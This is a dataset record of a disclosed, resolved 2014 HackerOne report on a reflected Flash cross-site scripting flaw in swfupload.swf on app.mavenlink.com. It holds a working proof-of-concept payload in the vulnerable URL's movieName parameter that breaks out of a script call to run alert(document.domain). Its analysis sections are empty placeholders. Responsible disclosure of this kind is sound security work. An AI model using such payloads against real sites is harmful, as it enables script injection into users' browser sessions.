---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '21150'
original_report_id: '21150'
title: Flash XSS  on swfupload.swf showing at app.mavenlink.com
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mavenlink
created_at: '2014-07-23T03:17:46.034Z'
disclosed_at: '2014-07-24T17:48:10.462Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Flash XSS  on swfupload.swf showing at app.mavenlink.com

## Metadata

- HackerOne Report ID: 21150
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mavenlink
- Disclosed At: 2014-07-24T17:48:10.462Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello Security I like to report a XSS that affect all users. This flash XSS can be very dangerous.

Vulnerable URL:

https://app.mavenlink.com/flash/swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!alert(document.domain);//

I attach image of Proof:

Any problem reproducing this bug please let me know.

PS: This Work with all browsers.

Regards.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
